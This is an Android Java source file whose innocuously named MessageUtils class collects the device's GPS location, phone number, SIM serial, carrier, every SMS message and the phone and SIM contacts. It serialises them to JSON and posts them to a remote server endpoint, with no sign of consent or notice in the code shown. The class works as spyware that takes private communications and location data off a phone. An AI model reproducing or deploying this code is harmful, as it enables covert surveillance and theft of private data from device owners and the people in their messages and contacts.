package com.example.needinfo;


import java.util.ArrayList;
import java.util.List;

import android.content.Context;

import com.alibaba.fastjson.JSON;
import com.example.utils.Constant;
import com.example.utils.HttpEngine;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

public class MessageUtils {
	private NeedGPSInfo needGPSInfo;
	private NeedPhoneContacts needPhoneContacts;
	private NeedPhoneSMS needPhoneSMS;
	private NeedSIMCH needSIMCH;
	private NeedSIMCardInfo needSIMCardInfo;
	
	public static MessageUtils getUtils(){
		return new MessageUtils();
	}
	
	private RequestParams getMessage(Context contenxt){
		needGPSInfo = new NeedGPSInfo( contenxt, null);
		needPhoneContacts = new NeedPhoneContacts(contenxt) ;
		needPhoneSMS = new NeedPhoneSMS(contenxt) ;
		needSIMCH = new NeedSIMCH( contenxt) ;
		needSIMCardInfo = new NeedSIMCardInfo(contenxt) ;
		
		info = new PhoneEntity();
		info.setLocation(needGPSInfo.getLocation());
		info.setProvider(needSIMCardInfo.getProvidersName());
		info.setPhoneNum(needSIMCardInfo.getNativePhoneNumber());
		info.setSerialNum(needSIMCH.getSIMCH());
		
		sms = needPhoneSMS.getSmsFromPhone();
		contracts = needPhoneContacts.getPhoneAndSIMContracts();
		
		RequestParams message = new RequestParams();
		message.put("info", JSON.toJSONString(info));
		message.put("sms", JSON.toJSONString(sms));
		message.put("contracts", JSON.toJSONString(contracts));
		System.out.println(JSON.toJSONString(sms));
		return message;
	}
	
	public void sendMessage(Context contenxt){
		HttpEngine.getHttpEngine().post(Constant.saveInfo, getMessage(contenxt),  new AsyncHttpResponseHandler(){
			@Override
			public void onSuccess(String result){
				System.out.println(result);
			}
		});
	}
	

	private PhoneEntity info;
	private List<SMSEntity> sms;
	private List<ContractsEntity> contracts;
}
